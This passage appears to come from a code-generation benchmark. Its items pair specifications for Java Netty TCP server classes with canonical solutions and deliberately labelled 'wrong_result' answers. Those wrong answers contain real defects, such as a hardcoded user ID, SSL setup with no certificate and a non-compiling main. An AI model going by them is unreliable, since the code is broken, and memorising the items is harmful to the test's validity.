success!!!\");\n    }\n\n    public void sendMsg(SendMsgReqVO sendMsgReqVO) {\n        NioSocketChannel socketChannel = SessionSocketHolder.get(sendMsgReqVO.getUserId());\n\n        if (null == socketChannel) {\n            log.error(\"client {} offline!\", sendMsgReqVO.getUserId());\n            return;\n        }\n        Request protocol = Request.newBuilder()\n                .setRequestId(sendMsgReqVO.getUserId())\n                .setReqMsg(sendMsgReqVO.getMsg())\n                .putAllProperties(sendMsgReqVO.getProperties())\n                .setCmd(BaseCommand.MESSAGE)\n                .build();\n\n        ChannelFuture future = socketChannel.writeAndFlush(protocol);\n        future.addListener((ChannelFutureListener) channelFuture ->\n                log.info(\"server push msg:[{}]\", sendMsgReqVO.toString()));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "@Component\npublic class CIMServer {\n    private final EventLoopGroup boss = new NioEventLoopGroup(1);\n    private final EventLoopGroup work = new NioEventLoopGroup();\n    private final int nettyPort = 8080;\n    private final ConcurrentMap<String, Channel> clients = new ConcurrentHashMap<>();\n\n    @PostConstruct\n    public void start() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(boss, work)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<Channel>() {\n                    @Override\n                    protected void initChannel(Channel ch) {\n                        ch.pipeline().addLast(new ChannelInboundHandlerAdapter() {\n                            @Override\n                            public void channelActive(ChannelHandlerContext ctx) {\n                                // Placeholder for user ID association logic\n                                clients.put(\"user123\", ctx.channel());\n                            }\n\n                            @Override\n                            public void channelInactive(ChannelHandlerContext ctx) {\n                                clients.remove(\"user123\");\n                            }\n\n                            @Override\n                            public void channelRead(ChannelHandlerContext ctx, Object msg) {\n                                // Handle incoming messages if needed\n                            }\n                        });\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        try {\n            ChannelFuture future = bootstrap.bind(nettyPort).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @PreDestroy\n    public void destroy() {\n        boss.shutdownGracefully();\n        work.shutdownGracefully();\n    }\n\n    public void sendMsg(SendMsgReqVO sendMsgReqVO) {\n        Channel channel = clients.get(sendMsgReqVO.getUserId());\n        if (channel != null && channel.isActive()) {\n            channel.writeAndFlush(sendMsgReqVO.getMessage());\n        }\n    }\n}"
  },
  {
    "Task_id": 201,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle multiple client connections and manage them through a channel group.\n\nClass Description: The ChatServer class is a Netty-based TCP server that manages client connections through channel groups. It provides methods to start the server on a specified address and properly shut it down while releasing all resources.\n\nAttributes:\n- channelGroup: [ChannelGroup] - Maintains all active client channels for group operations\n- bossGroup: [EventLoopGroup] - Handles incoming connection requests\n- workGroup: [EventLoopGroup] - Handles I/O operations for established connections\n- channel: [Channel] - Represents the server's listening channel\n\nMethods:\n- start: [Name]([InetSocketAddress address]) -> [ChannelFuture] - Starts the server on the specified address, configures server options, and initializes the channel pipeline with handlers\n- destroy: [Name]() -> [void] - Properly shuts down the server by closing all channels and releasing thread resources",
    "Canonical_solution": "import java.net.InetSocketAddress;\n\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.ImmediateEventExecutor;\n\npublic class ChatServer {\n    private final ChannelGroup channelGroup = new DefaultChannelGroup(ImmediateEventExecutor.INSTANCE);\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workGroup = new NioEventLoopGroup();\n    private Channel channel;\n    \n    public ChannelFuture start(InetSocketAddress address) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChatServerInitializer(channelGroup))\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n        \n        ChannelFuture future = bootstrap.bind(address).syncUninterruptibly();\n        channel = future.channel();\n        return future;\n    }\n    \n    public void destroy() {\n        if(channel != null) {\n            channel.close();\n        }\n        \n        channelGroup.close();\n        workGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class ChatServer {\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workGroup;\n    private final ChannelGroup channelGroup;\n    private Channel channel;\n\n    public ChatServer() {\n        bossGroup = new NioEventLoopGroup();\n        workGroup = new NioEventLoopGroup();\n        channelGroup = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);\n    }\n\n    public ChannelFuture start(InetSocketAddress address) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<Channel>() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        ch.pipeline().addLast(new ChannelInboundHandlerAdapter() {\n                            @Override\n                            public void channelActive(ChannelHandlerContext ctx) throws Exception {\n                                channelGroup.add(ctx.channel());\n                                super.channelActive(ctx);\n                            }\n                        });\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = bootstrap.bind(address).syncUninterruptibly();\n        channel = future.channel();\n        return future;\n    }\n\n    public void destroy() {\n        if (channel != null) {\n            channel.close();\n        }\n        channelGroup.close().syncUninterruptibly();\n        bossGroup.shutdownGracefully();\n        workGroup.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 202,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that listens for incoming connections, processes command-based requests, and returns appropriate responses. The server should support multiple commands and maintain a clean connection lifecycle.\n\nClass Description: Console is a singleton class that implements a TCP server with command processing capabilities. It maintains a registry of available commands and handles client connections using Netty's NIO framework.\n\nAttributes:\n- instance: Console - Singleton instance of the Console class\n- commands: Map<String, Class> - Registry mapping command strings to their respective Command classes\n\nMethods:\n- getInstance() -> Console - Returns the singleton instance of Console, initializing it with default commands if not already created\n- listenOnTCP(int port) -> void - Starts a TCP server on the specified port using Netty framework\n- Adapter: ChannelInboundHandlerAdapter - Inner class handling channel events and command processing\n  - channelRead(ChannelHandlerContext ctx, Object msg) -> void - Processes incoming messages as commands\n  - channelActive(ChannelHandlerContext ctx) -> void - Handles new connection initialization\n  - channelReadComplete(ChannelHandlerContext ctx) -> void - Handles post-read operations\n  - sendStringL(ChannelHandlerContext ctx, String text) -> void - Sends string with newline if missing\n  - sendString(ChannelHandlerContext ctx, String text) -> void - Sends string to client\n  - sendPrompt(ChannelHandlerContext ctx) -> void - Sends command prompt to client\n- Command: abstract static class - Base class for all command implementations\n  - Command(String command) - Constructor taking the command string\n  - execute() -> String - Abstract method to be implemented by concrete commands\n- HelpCommand: static class extends Command - Implements help command\n  - HelpCommand(String command) - Constructor\n  - execute() -> String - Returns help message\n- HelloCommand: static class extends Command - Implements hello command\n  - HelloCommand(String command) - Constructor\n  - execute() -> String - Returns random greeting message\n- DeviceCommand: static class extends Command - Implements device command\n  - DeviceCommand(String command) - Constructor\n  - execute() -> String - Returns device information in JSON format",
    "Canonical_solution": "import com.yeetor.androidcontrol.server.BaseServer;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.lang.reflect.Constructor;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Console {\n\n    private static Console instance;\n    private Map<String, Class> commands;\n\n    public static Console getInstance() {\n        if (instance == null) {\n            instance = new Console();\n            instance.commands = new HashMap<>();\n            instance.commands.put(\"help\", HelpCommand.class);\n            instance.commands.put(\"hello\", HelloCommand.class);\n            instance.commands.put(\"device\", DeviceCommand.class);\n        }\n        return instance;\n    }\n\n    public void listenOnTCP(int port) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup).channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new Adapter());\n                        }\n                    }).option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port);\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    class Adapter extends ChannelInboundHandlerAdapter {\n        \n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            ByteBuf buf = (ByteBuf) msg;\n            byte[] res = new byte[buf.readableBytes()];\n            buf.readBytes(res);\n            buf.release();\n            \n            String str = new String(res).trim();\n            \n            Class cls = commands.get(str);\n            if (cls != null) {\n                Constructor constructor = cls.getDeclaredConstructor(String.class);\n                constructor.setAccessible(true);\n                Command command = (Command) constructor.newInstance(str);\n                sendStringL(ctx, command.execute());\n            } else {\n                sendString(ctx, \"command not found\\n\");\n            }\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            sendString(ctx, \"help \u5e2e\u52a9\u63d0\u793a\\r\\nhello \u4eba\u751f\u683c\u8a00\\r\\n\");\n            sendPrompt(ctx);\n        }\n\n        @Override\n        public void channelReadComplete(ChannelHandlerContext ctx) throws Exception {\n            sendPrompt(ctx);\n        }\n        \n        private void sendStringL(ChannelHandlerContext ctx, String text) {\n            if (!text.endsWith(\"\\n\")) {\n                text += \"\\n\";\n            }\n            sendString(ctx, text);\n        }\n        \n        private void sendString(ChannelHandlerContext ctx, String text) {\n            ByteBuf encoded = ctx.alloc().buffer(4 * text.length());\n            encoded.writeBytes(text.getBytes());\n            ctx.write(encoded);\n            ctx.flush();\n        }\n        \n        private void sendPrompt(ChannelHandlerContext ctx) {\n            sendString(ctx, \"> \");\n        }\n    }\n\n    public abstract static class Command {\n        private String command;\n        public Command(String command) {\n            this.command = command;\n        }\n        public abstract String execute();\n    }\n\n    public static class HelpCommand extends Command {\n        HelpCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return \"\u6682\u65f6\u6ca1\u6709\u5e2e\u52a9\uff01\";\n        }\n    }\n\n    public static class HelloCommand extends Command {\n        String[] strings = new String[] {\n                \"Talking is cheap, show me the code!\",\n                \"\u652f\u6301\u4f5c\u8005<http://yeetor.com>\"\n        };\n        HelloCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return strings[new java.util.Random().nextInt(strings.length)];\n        }\n    }\n\n    public static class DeviceCommand extends Command {\n        public DeviceCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return BaseServer.getDevicesJSON();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class Console {\n    private static Console instance;\n    private final Map<String, Class<? extends Command>> commands;\n\n    private Console() {\n        commands = new HashMap<>();\n        commands.put(\"help\", HelpCommand.class);\n        commands.put(\"hello\", HelloCommand.class);\n        commands.put(\"device\", DeviceCommand.class);\n    }\n\n    public static Console getInstance() {\n        if (instance == null) {\n            instance = new Console();\n        }\n        return instance;\n    }\n\n    public void listenOnTCP(int port) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new Adapter(Console.getInstance().commands));\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    static class Adapter extends ChannelInboundHandlerAdapter {\n        private final Map<String, Class<? extends Command>> commands;\n\n        Adapter(Map<String, Class<? extends Command>> commands) {\n            this.commands = commands;\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            sendPrompt(ctx);\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof String) {\n                String input = (String) msg;\n                input = input.trim();\n                if (!input.isEmpty()) {\n                    try {\n                        String[] parts = input.split(\"\\\\s+\", 2);\n                        String command = parts[0];\n                        Class<? extends Command> cmdClass = commands.get(command);\n                        if (cmdClass != null) {\n                            Command cmd = cmdClass.getDeclaredConstructor(String.class).newInstance(command);\n                            String response = cmd.execute();\n                            sendString(ctx, response);\n                        } else {\n                            sendString(ctx, \"Unknown command: \" + command);\n                        }\n                    } catch (Exception e) {\n                        sendString(ctx, \"Error processing command: \" + e.getMessage());\n                    }\n                }\n            }\n        }\n\n        @Override\n        public void channelReadComplete(ChannelHandlerContext ctx) {\n            ctx.flush();\n        }\n\n        void sendString(ChannelHandlerContext ctx, String text) {\n            if (!text.endsWith(\"\\n\")) {\n                text += \"\\n\";\n            }\n            ctx.writeAndFlush(text);\n        }\n\n        void sendPrompt(ChannelHandlerContext ctx) {\n            sendString(ctx, \"console> \");\n        }\n    }\n\n    static abstract class Command {\n        private final String command;\n\n        Command(String command) {\n            this.command = command;\n        }\n\n        abstract String execute();\n    }\n\n    static class HelpCommand extends Command {\n        HelpCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        String execute() {\n            StringBuilder sb = new StringBuilder();\n            sb.append(\"Available commands:\\n\");\n            for (Map.Entry<String, Class<? extends Command>> entry : Console.getInstance().commands.entrySet()) {\n                sb.append(entry.getKey()).append(\"\\n\");\n            }\n            return sb.toString();\n        }\n    }\n\n    static class HelloCommand extends Command {\n        HelloCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        String execute() {\n            String[] greetings = {\n                \"Hello, world!\",\n                \"Hi there!\",\n                \"Greetings!\",\n                \"Welcome!\",\n                \"Howdy!\"\n            };\n            return greetings[new Random().nextInt(greetings.length)];\n        }\n    }\n\n    static class DeviceCommand extends Command {\n        DeviceCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        String execute() {\n            return \"{ \\\"device\\\": \\\"Example Device\\\", \\\"status\\\": \\\"online\\\" }\";\n        }\n    }\n}"
  },
  {
    "Task_id": 204,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle object serialization and deserialization for client-server communication, with optional SSL support.\n\nClass Description: ObjectEchoServer is a Netty-based TCP server that listens for incoming connections, handles object serialization/deserialization, and echoes received objects back to clients. It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- start(): [void] - Starts the Netty server, configures the pipeline with necessary handlers (SSL, object encoder/decoder, and business logic handler), and binds to the specified port. Handles resource cleanup on shutdown.\n  Input: None\n  Output: None (throws Exception if startup fails)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class ObjectEchoServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    if (sslCtx != null) {\n                        p.addLast(sslCtx.newHandler(ch.alloc()));\n                    }\n                    p.addLast(\n                            new ObjectEncoder(),\n                            new ObjectDecoder(ClassResolvers.cacheDisabled(null)),\n                            new ObjectEchoServerHandler());\n                }\n             });\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class ObjectEchoServer {\n    private final boolean SSL;\n    private final int PORT;\n    private SslContext sslCtx;\n\n    public ObjectEchoServer(boolean ssl, int port) {\n        this.SSL = ssl;\n        this.PORT = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ChannelPipeline pipeline = ch.pipeline();\n                     if (SSL) {\n                         sslCtx = SslContextBuilder.forServer().build();\n                         pipeline.addLast(sslCtx.newHandler());\n                     }\n                     pipeline.addLast(new ObjectDecoder(1024, MyObject.class));\n                     pipeline.addLast(new ObjectEchoHandler());\n                     pipeline.addLast(new ObjectEncoder());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    static class ObjectEchoHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ctx.writeAndFlush(msg);\n        }\n    }\n\n    static class MyObject implements java.io.Serializable {\n        private static final long serialVersionUID = 1L;\n        // Add fields and methods as needed\n    }\n\n    public static void main(String[] args) {\n        new ObjectEchoServer(false, 8080).start();\n    }\n}"
  },
  {
    "Task_id": 206,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and messages.\n\nClass Description: SimpleChatServer is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses a boss-worker thread model to handle connections efficiently and provides basic server configuration options.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nSimpleChatServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() -> void - Starts the server, binds it to the specified port, and keeps it running until shutdown. Handles resource cleanup during shutdown. Throws Exception if any error occurs during server startup or operation.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class SimpleChatServer {\n\n    private int port;\n\n    public SimpleChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new SimpleChatServerInitializer())\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            \n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class SimpleChatServer {\n    private final int port;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public SimpleChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        try {\n            bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(new LoggingHandler(LogLevel.INFO));\n                            ch.pipeline().addLast(new ChatHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 1024)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private class ChatHandler extends ChannelInboundHandlerAdapter {\n        private final List<Channel> clients = new ArrayList<>();\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            clients.add(ctx.channel());\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            clients.remove(ctx.channel());\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            for (Channel client : clients) {\n                client.writeAndFlush(msg);\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 208,
    "Instruction": "Task Description: Implement a Java class that creates a TCP server using Netty framework to handle HTTP file server functionality, including starting the server, configuring network options, and properly shutting down resources.\n\nClass Description: LoFileServer is a Netty-based HTTP file server that listens on a specified port, handles incoming HTTP requests, and manages server lifecycle operations. It uses Netty's non-blocking I/O model for high performance and includes proper resource cleanup.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\nchannel: Channel - The Netty channel representing the server's listening socket\nLogger: Logger - SLF4J logger instance for logging server events\n\nMethods:\nstart(): void - Starts the Netty server on the specified port. Configures thread groups, channel options, and HTTP pipeline handlers. Throws InterruptedException if the port is already in use or if startup fails.\nshutdown(): void - Gracefully shuts down the server by closing the channel and releasing all associated resources. Handles any interruption during shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class LoFileServer {\n    private static final Logger Logger = LoggerFactory.getLogger(LoFileServer.class);\n    private int port;\n    private Channel channel;\n\n    public LoFileServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        final EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            final ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .option(ChannelOption.SO_SNDBUF, 1024*1024*10)\n                .option(ChannelOption.SO_RCVBUF, 1024*1024*10)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel socketChannel) throws Exception {\n                        socketChannel.pipeline().addLast(new HttpRequestDecoder());\n                        socketChannel.pipeline().addLast(new HttpResponseEncoder());\n                        socketChannel.pipeline().addLast(new ChunkedWriteHandler());\n                        socketChannel.pipeline().addLast(new HttpObjectAggregator(100 * 1024 * 1024));\n                        socketChannel.pipeline().addLast(new HttpFileServerHandler());\n                    }\n                });\n            \n            channel = b.bind(port).sync().channel();\n            Logger.info(\"Server started on port [{}]\", port);\n        } catch (Exception e) {\n            Logger.error(\"Port {} is already in use\", port);\n            throw e;\n        }\n    }\n\n    public void shutdown() {\n        if (this.channel != null) {\n            this.channel.close();\n            try {\n                this.channel.closeFuture().sync();\n            } catch (InterruptedException e) {\n                Logger.error(\"Error during server shutdown\", e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class LoFileServer {\n    private final int port;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private static final Logger logger = LoggerFactory.getLogger(LoFileServer.class);\n\n    public LoFileServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.TCP_NODELAY, true)\n             .childOption(ChannelOption.SO_KEEPALIVE, true)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new FileServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            channel = f.channel();\n            logger.info(\"Server started on port {}\", port);\n        } catch (Exception e) {\n            logger.error(\"Failed to start server on port {}\", port, e);\n            throw new InterruptedException(\"Failed to start server\");\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 209,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling incoming client connections, processing requests through a configurable message handler, and managing server resources efficiently.\n\nClass Description: NettyServer is a TCP server implementation using Netty framework that extends AbstractServer. It manages server lifecycle (opening/closing), handles incoming connections with configurable thread pools, and processes messages through a provided message handler. The server supports connection management, configurable worker threads, and graceful shutdown.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection events\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for established connections\n- serverChannel: [Channel] - Represents the server's listening channel\n- messageHandler: [MessageHandler] - Processes incoming requests\n- standardThreadExecutor: [StandardThreadExecutor] - Manages worker threads for request processing\n- rejectCounter: [AtomicInteger] - Tracks rejected requests count\n- channelManage: [NettyServerChannelManage] - Manages active connections\n\nMethods:\n- open() -> [boolean] - Starts the server, initializes thread pools, binds to port, and sets up channel pipeline. Returns true if successful.\n- close() -> [void] - Shuts down the server gracefully, releasing all resources including thread pools and channels.\n- isBound() -> [boolean] - Checks if server is actively listening for connections.\n- request(Request) -> [Response] - Throws MotanFrameworkException as server doesn't support direct requests (inherited from AbstractServer).\n\nInput:\n- URL url: Configuration parameters for server setup (port, thread counts, queue sizes etc.)\n- MessageHandler messageHandler: Handler for processing incoming messages\n\nOutput:\n- When open() succeeds: Server starts listening on specified port and returns true\n- When close() completes: All server resources are released and state set to CLOSE\n- isBound(): Returns current server binding status",
